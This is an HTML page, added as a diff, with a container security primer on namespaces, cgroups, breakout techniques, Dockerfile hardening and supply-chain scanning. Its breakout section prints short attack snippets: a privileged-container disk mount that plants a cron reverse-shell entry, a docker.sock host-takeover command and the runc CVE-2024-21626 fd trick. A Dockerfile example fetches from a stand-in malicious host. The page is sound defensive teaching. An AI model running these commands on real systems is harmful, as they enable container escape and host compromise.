@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en" class="bg-gray-950 text-white">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Container Security Primer | D. Chandler Prince</title>
+    <meta http-equiv="Content-Security-Policy"
+        content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; font-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'self';">
+</head>
+
+<body class="bg-gray-950 text-white min-h-screen flex flex-col">
+
+    <site-nav></site-nav>
+
+    <header class="bg-gradient-to-r from-teal-900 to-gray-900 py-10 px-4 text-center shadow-lg">
+        <h1 class="text-4xl md:text-5xl font-bold mb-2 text-white tracking-tight">Container Security Primer</h1>
+        <p class="max-w-2xl mx-auto text-gray-200 text-lg">
+            Moving beyond "scan your images." A deep dive into kernel isolation, container breakouts, and runtime
+            defense.
+        </p>
+    </header>
+
+    <main class="flex-1 px-4 py-10 max-w-6xl mx-auto w-full space-y-12">
+
+        <!-- Section 1: The Mechanics of Isolation -->
+        <section>
+            <h2 class="text-3xl font-bold text-teal-400 mb-6 flex items-center gap-2">
+                <span data-lucide="layers"></span> The Mechanics of Isolation
+            </h2>
+            <div class="grid md:grid-cols-3 gap-6">
+
+                <div class="bg-gray-900 p-5 rounded-xl border border-gray-800 flex flex-col">
+                    <div class="mb-4"><span data-lucide="eye" class="text-blue-400"></span></div>
+                    <h3 class="text-xl font-bold text-white mb-2">Namespaces (Visibility)</h3>
+                    <p class="text-gray-400 text-sm">
+                        Namespaces lie to the process about what it can <em>see</em>. A container thinks it is PID 1,
+                        but on the host, it might be PID 14302. It has its own network stack (<code>NET</code>) and
+                        mount points (<code>MNT</code>), creating the illusion of a standalone system.
+                    </p>
+                </div>
+
+                <div class="bg-gray-900 p-5 rounded-xl border border-gray-800 flex flex-col">
+                    <div class="mb-4"><span data-lucide="cpu" class="text-green-400"></span></div>
+                    <h3 class="text-xl font-bold text-white mb-2">Cgroups (Resources)</h3>
+                    <p class="text-gray-400 text-sm">
+                        Control Groups (cgroups) limit what a process can <em>use</em>. They enforce quotas on CPU
+                        cycles, memory usage, and I/O. This prevents a "noisy neighbor" container from starving the host
+                        or other pods.
+                    </p>
+                </div>
+
+                <div class="bg-gray-900 p-5 rounded-xl border border-gray-800 flex flex-col relative overflow-hidden">
+                    <div class="absolute -right-4 -top-4 bg-red-900/10 w-32 h-32 rounded-full blur-2xl"></div>
+                    <div class="mb-4"><span data-lucide="alert-octagon" class="text-red-400"></span></div>
+                    <h3 class="text-xl font-bold text-white mb-2">The Shared Kernel</h3>
+                    <p class="text-gray-400 text-sm">
+                        <strong>The Critical Weakness.</strong> Unlike a VM, which has its own kernel, containers share
+                        the host's kernel. If a containerized process triggers a kernel panic or exploits a kernel
+                        vulnerability (like Dirty Cow), the <strong>entire host goes down</strong>.
+                    </p>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- Section 2: Anatomy of a Breakout -->
+        <section>
+            <h2 class="text-3xl font-bold text-teal-400 mb-6 flex items-center gap-2">
+                <span data-lucide="skull" class="text-red-400"></span> Anatomy of a Breakout
+            </h2>
+            <div class="grid md:grid-cols-2 gap-6">
+
+                <!-- Privileged -->
+                <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
+                    <div class="flex items-center justify-between mb-3">
+                        <h3 class="text-lg font-bold text-white">The "Privileged" Flag</h3>
+                        <span
+                            class="text-xs bg-red-900/50 text-red-200 px-2 py-1 rounded border border-red-800 font-mono">--privileged</span>
+                    </div>
+                    <p class="text-gray-400 text-sm mb-3">
+                        This mode effectively disables all isolation. It mounts the host's <code>/dev</code> directory,
+                        allowing the container to mount the host's hard drive and modify system files.
+                    </p>
+                    <div class="bg-black/30 p-3 rounded border border-gray-700 font-mono text-xs text-red-300">
+                        mount /dev/sda1 /mnt/host_root<br>
+                        echo "* * * * * root rev_shell" >> /mnt/host_root/etc/crontab
+                    </div>
+                </div>
+
+                <!-- Docker Socket -->
+                <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
+                    <div class="flex items-center justify-between mb-3">
+                        <h3 class="text-lg font-bold text-white">The Docker Socket</h3>
+                        <span
+                            class="text-xs bg-orange-900/50 text-orange-200 px-2 py-1 rounded border border-orange-800 font-mono">/var/run/docker.sock</span>
+                    </div>
+                    <p class="text-gray-400 text-sm mb-3">
+                        Mounting the socket gives the container "root" over the Docker daemon. It can spawn
+                        <em>sibling</em> containers efficiently, but can also spawn a privileged container to take over
+                        the host.
+                    </p>
+                    <div class="bg-black/30 p-3 rounded border border-gray-700 font-mono text-xs text-orange-300">
+                        docker run -v /:/host --privileged ubuntu chroot /host
+                    </div>
+                </div>
+
+                <!-- Leaky Vessels -->
+                <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
+                    <div class="flex items-center justify-between mb-3">
+                        <h3 class="text-lg font-bold text-white">Leaky Vessels (runc)</h3>
+                        <span
+                            class="text-xs bg-yellow-900/50 text-yellow-200 px-2 py-1 rounded border border-yellow-800 font-mono">CVE-2024-21626</span>
+                    </div>
+                    <p class="text-gray-400 text-sm mb-3">
+                        A race condition in `runc` allowed containers to access the host filesystem via leaked file
+                        descriptors (like `/proc/self/fd/7`). Attackers could overwrite host binaries.
+                    </p>
+                    <div class="bg-black/30 p-3 rounded border border-gray-700 font-mono text-xs text-yellow-300">
+                        WORKDIR /proc/self/fd/7<br>
+                        # Now inside host namespace
+                    </div>
+                </div>
+
+                <!-- Capabilities -->
+                <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
+                    <div class="flex items-center justify-between mb-3">
+                        <h3 class="text-lg font-bold text-white">Capabilities</h3>
+                        <span
+                            class="text-xs bg-purple-900/50 text-purple-200 px-2 py-1 rounded border border-purple-800 font-mono">CAP_SYS_ADMIN</span>
+                    </div>
+                    <p class="text-gray-400 text-sm mb-3">
+                        Capabilities break "root" into small pieces. <code>CAP_SYS_ADMIN</code> is the "new root"—it
+                        allows too many sensitive syscalls (like `mount`, `swapon`, `setns`).
+                    </p>
+                    <div class="bg-black/30 p-3 rounded border border-gray-700 font-mono text-xs text-purple-300">
+                        securityContext:<br>
+                        &nbsp;&nbsp;capabilities:<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;drop: ["ALL"]
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- Section 3: The Dockerfile Rules -->
+        <section>
+            <h2 class="text-3xl font-bold text-teal-400 mb-6 flex items-center gap-2">
+                <span data-lucide="file-code"></span> The Dockerfile Rules
+            </h2>
+            <div class="space-y-4">
+
+                <!-- Rule 1 -->
+                <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 grid md:grid-cols-12 gap-4 items-center">
+                    <div class="md:col-span-3">
+                        <h3 class="font-bold text-white">1. User Context</h3>
+                        <p class="text-xs text-gray-400">Avoid running as root.</p>
+                    </div>
+                    <div
+                        class="md:col-span-4 bg-red-900/10 p-2 rounded border border-red-900/30 text-xs font-mono text-red-300">
+                        <span class="text-red-500 font-bold">BAD:</span> (Default)<br># user is root
+                    </div>
+                    <div
+                        class="md:col-span-5 bg-green-900/10 p-2 rounded border border-green-900/30 text-xs font-mono text-green-300">
+                        <span class="text-green-500 font-bold">GOOD:</span><br>
+                        USER appuser
+                    </div>
+                </div>
+
+                <!-- Rule 2 -->
+                <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 grid md:grid-cols-12 gap-4 items-center">
+                    <div class="md:col-span-3">
+                        <h3 class="font-bold text-white">2. Handling Secrets</h3>
+                        <p class="text-xs text-gray-400">Don't bake keys into layers.</p>
+                    </div>
+                    <div
+                        class="md:col-span-4 bg-red-900/10 p-2 rounded border border-red-900/30 text-xs font-mono text-red-300">
+                        <span class="text-red-500 font-bold">BAD:</span><br>ENV API_KEY="12345"
+                    </div>
+                    <div
+                        class="md:col-span-5 bg-green-900/10 p-2 rounded border border-green-900/30 text-xs font-mono text-green-300">
+                        <span class="text-green-500 font-bold">GOOD:</span><br>
+                        RUN --mount=type=secret,id=api_key ...
+                    </div>
+                </div>
+
+                <!-- Rule 3 -->
+                <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 grid md:grid-cols-12 gap-4 items-center">
+                    <div class="md:col-span-3">
+                        <h3 class="font-bold text-white">3. ADD vs COPY</h3>
+                        <p class="text-xs text-gray-400">ADD has risky remote fetch magic.</p>
+                    </div>
+                    <div
+                        class="md:col-span-4 bg-red-900/10 p-2 rounded border border-red-900/30 text-xs font-mono text-red-300">
+                        <span class="text-red-500 font-bold">BAD:</span><br>ADD https://mal.site/x.sh .
+                    </div>
+                    <div
+                        class="md:col-span-5 bg-green-900/10 p-2 rounded border border-green-900/30 text-xs font-mono text-green-300">
+                        <span class="text-green-500 font-bold">GOOD:</span><br>
+                        COPY ./local-file .
+                    </div>
+                </div>
+
+                <!-- Rule 4 -->
+                <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 grid md:grid-cols-12 gap-4 items-center">
+                    <div class="md:col-span-3">
+                        <h3 class="font-bold text-white">4. Multi-Stage Builds</h3>
+                        <p class="text-xs text-gray-400">Production shouldn't have `gcc`.</p>
+                    </div>
+                    <div
+                        class="md:col-span-4 bg-red-900/10 p-2 rounded border border-red-900/30 text-xs font-mono text-red-300">
+                        <span class="text-red-500 font-bold">BAD:</span><br>FROM golang:1.21<br># entire sdk included
+                    </div>
+                    <div
+                        class="md:col-span-5 bg-green-900/10 p-2 rounded border border-green-900/30 text-xs font-mono text-green-300">
+                        <span class="text-green-500 font-bold">GOOD:</span><br>
+                        COPY --from=builder /app /app
+                    </div>
+                </div>
+
+                <!-- Rule 5 -->
+                <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 grid md:grid-cols-12 gap-4 items-center">
+                    <div class="md:col-span-3">
+                        <h3 class="font-bold text-white">5. .dockerignore</h3>
+                        <p class="text-xs text-gray-400">Context size & secret leaks.</p>
+                    </div>
+                    <div
+                        class="md:col-span-4 bg-red-900/10 p-2 rounded border border-red-900/30 text-xs font-mono text-red-300">
+                        <span class="text-red-500 font-bold">BAD:</span><br>COPY . . <br># copies .env too!
+                    </div>
+                    <div
+                        class="md:col-span-5 bg-green-900/10 p-2 rounded border border-green-900/30 text-xs font-mono text-green-300">
+                        <span class="text-green-500 font-bold">GOOD:</span><br>
+                        # .dockerignore<br>**/.env
+                    </div>
+                </div>
+
+                <!-- Rule 6 -->
+                <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 grid md:grid-cols-12 gap-4 items-center">
+                    <div class="md:col-span-3">
+                        <h3 class="font-bold text-white">6. Base Image</h3>
+                        <p class="text-xs text-gray-400">Minimal surface area.</p>
+                    </div>
+                    <div
+                        class="md:col-span-4 bg-red-900/10 p-2 rounded border border-red-900/30 text-xs font-mono text-red-300">
+                        <span class="text-red-500 font-bold">BAD:</span><br>FROM ubuntu:latest
+                    </div>
+                    <div
+                        class="md:col-span-5 bg-green-900/10 p-2 rounded border border-green-900/30 text-xs font-mono text-green-300">
+                        <span class="text-green-500 font-bold">GOOD:</span><br>
+                        FROM gcr.io/distroless/static
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- Section 4: Supply Chain & Golden Pipeline -->
+        <section>
+            <h2 class="text-3xl font-bold text-teal-400 mb-6 flex items-center gap-2">
+                <span data-lucide="factory"></span> Supply Chain & The "Golden" Pipeline
+            </h2>
+
+            <!-- Changed from grid-cols-3 to flex col to ensure full width -->
+            <div class="flex flex-col gap-8">
+
+                <!-- Area A: The "Latest" Tag -->
+                <div class="bg-gray-900 p-6 rounded-xl border border-gray-800 w-full">
+                    <h3 class="text-xl font-bold text-white mb-4 flex items-center gap-2">
+                        <span data-lucide="tag" class="text-blue-400"></span> The "Latest" Tag & Supply Chain Risk
+                    </h3>
+                    <div class="overflow-x-auto">
+                        <table class="w-full text-left border-collapse">
+                            <thead>
+                                <tr class="border-b border-gray-700 text-gray-400 text-sm uppercase tracking-wider">
+                                    <th class="p-3">Scenario</th>
+                                    <!-- Verdict column removed -->
+                                    <th class="p-3">Reasoning</th>
+                                </tr>
+                            </thead>
+                            <tbody class="text-sm">
+                                <tr class="border-b border-gray-800 group hover:bg-gray-800/50">
+                                    <td class="p-3 font-semibold text-white">A. Public Registry (Docker Hub)</td>
+                                    <!-- Verdict cell removed -->
+                                    <td class="p-3 text-gray-400">
+                                        <strong>Supply Chain Poisoning.</strong> You don't control the account. If
+                                        maintainer creds are stolen, <code>:latest</code> becomes malware. <span
+                                            class="text-blue-300">Fix: Pin by Digest (@sha256).</span>
+                                    </td>
+                                </tr>
+                                <tr class="group hover:bg-gray-800/50">
+                                    <td class="p-3 font-semibold text-white">B. Internal Golden Registry</td>
+                                    <!-- Verdict cell removed -->
+                                    <td class="p-3 text-gray-400">
+                                        <strong>Chain of Custody.</strong> You own this registry. <code>:latest</code>
+                                        here acts as a "Verified Stable" pointer for teams to get security patches
+                                        automatically.
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- Area B: The Gatekeeper (Detailed) -->
+                <div class="bg-gray-900 p-6 rounded-xl border border-gray-800 w-full">
+                    <div class="flex items-center gap-3 mb-4">
+                        <div class="p-2 bg-orange-900/20 rounded-lg"><span data-lucide="scan-search"
+                                class="text-orange-400 w-6 h-6"></span></div>
+                        <div>
+                            <h3 class="text-xl font-bold text-white">The Gatekeeper: Trivy</h3>
+                            <p class="text-xs text-orange-400 uppercase font-bold tracking-wider">First Line of Defense
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="grid md:grid-cols-2 gap-8">
+                        <div>
+                            <p class="text-gray-300 text-sm leading-relaxed mb-4">
+                                Trivy is the industry standard for <strong>static analysis</strong> because it's a
+                                simple, single binary that runs anywhere (CI pipelines, developer laptops, or air-gapped
+                                servers). It scans:
+                            </p>
+                            <ul class="text-gray-400 text-sm list-disc list-inside mb-4 space-y-1">
+                                <li><strong>OS Packages:</strong> (apk, dpkg, rpm) for known CVEs.</li>
+                                <li><strong>Language Deps:</strong> (npm, pip, go.mod) for vulnerable libraries.</li>
+                                <li><strong>Misconfigurations:</strong> (IaC) likes running as root.</li>
+                            </ul>
+                            <div
+                                class="bg-black/30 p-3 rounded border border-gray-700 font-mono text-xs text-orange-200">
+                                trivy image --exit-code 1 --severity CRITICAL my-image:latest
+                            </div>
+                        </div>
+                        <div class="bg-gray-800/50 p-4 rounded-lg border border-gray-700 text-sm">
+                            <h4 class="font-bold text-white mb-2 flex items-center gap-2">
+                                <span data-lucide="alert-octagon" class="text-yellow-400 w-4 h-4"></span> The Context
+                                Gap
+                            </h4>
+                            <p class="text-gray-400 mb-2">
+                                Basic scanners like Trivy report <em>everything</em>. This creates noise. Enterprise
+                                tools (like Wiz, Prisma, or Snyk) add critical context:
+                            </p>
+                            <ul class="text-gray-400 list-disc list-inside space-y-1">
+                                <li><strong>Exploitability:</strong> Is the vulnerable package actually loaded in
+                                    memory? (Reachability analysis).</li>
+                                <li><strong>Fix Availability:</strong> Can we even fix it? (Filtering "wont-fix" noise).
+                                </li>
+                                <li><strong>Attack Path:</strong> Is the container exposed to the internet?</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Area C: Golden Pipeline Diagram -->
+                <div class="bg-gray-900 p-6 rounded-xl border border-gray-800 w-full">
+                    <div class="flex items-center gap-2 mb-3">
+                        <span data-lucide="factory" class="text-purple-400"></span>
+                        <h3 class="text-lg font-bold text-white">The Golden Image Pipeline (Build or Buy)</h3>
+                    </div>
+                    <div class="grid md:grid-cols-2 gap-8 text-sm text-gray-400 leading-relaxed">
+                        <div>
+                            <h4 class="font-bold text-white mb-2">The "Build" Approach</h4>
+                            <p class="mb-3">
+                                Dedicating an internal platform team to maintain <strong>Golden Images</strong>. This
+                                team starts with an upstream OS (like Alpine), strips unused binaries (shells, package
+                                managers), patches vulnerabilities nightly, and signs the result with
+                                <strong>Cosign</strong>. Downstream developers are forced to use `FROM
+                                internal/golden-node:18`, inheriting this hardened posture automatically.
+                            </p>
+                        </div>
+                        <div>
+                            <h4 class="font-bold text-white mb-2">The "Buy" Approach</h4>
+                            <p class="mb-3">
+                                Offloading the burden to vendors like <strong>Chainguard</strong> or
+                                <strong>RapidFort</strong>. These providers offer "Distroless" images—containers
+                                containing <em>only</em> your application and its direct dependencies. No `bash`, no
+                                `curl`, no `apt`. This drastically reduces the attack surface and CVE noise, effectively
+                                purchasing a near-zero vulnerability state.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+    </main>
+
+    <site-footer></site-footer>
+
+    <script type="module" src="/container.js"></script>
+    <script type="module" src="/main.js"></script>
+</body>
+
+</html>
